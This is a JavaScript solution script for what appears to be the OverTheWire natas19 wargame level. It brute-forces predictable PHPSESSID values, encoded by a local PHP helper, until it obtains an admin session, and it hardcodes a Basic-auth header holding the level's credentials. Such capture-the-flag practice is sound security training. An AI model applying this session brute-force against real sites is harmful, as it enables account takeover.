import { promisify } from "util";
const exec = promisify((await import("child_process")).exec);


let adminId = null;

if (!adminId) {
    for (let i = 1; i <= 640; i++) {
        const id = await encodeAdminId(i);
        const admin = await isAdmin(id);
        console.log(id, admin);
        if (admin) {
            adminId = id;
            break;
        }
    }
}

console.log("page:", await getPage(adminId));


async function getPage(id) {
    return await fetch("http://natas19.natas.labs.overthewire.org/index.php", {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en,fi-FI;q=0.9,fi;q=0.8,en-US;q=0.7",
            "authorization": "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "upgrade-insecure-requests": "1",
            "cookie": `__utma=176859643.1981211129.1690143695.1690143695.1690143695.1; __utmc=176859643; __utmz=176859643.1690143695.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=${id}`
        },
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": null,
        "method": "GET"
    }).then(res => res.text());
}

async function encodeAdminId(num) {
    const cmd = "php natas19.php " + num;
    console.log("running:", cmd);
    const { stdout, stderr } = await exec(cmd);
    console.log("stdout:", stdout);
    return stdout;
}

async function isAdmin(id) {
    const page = await getPage(id);

    return !page.includes("You are logged in as a regular user.");
}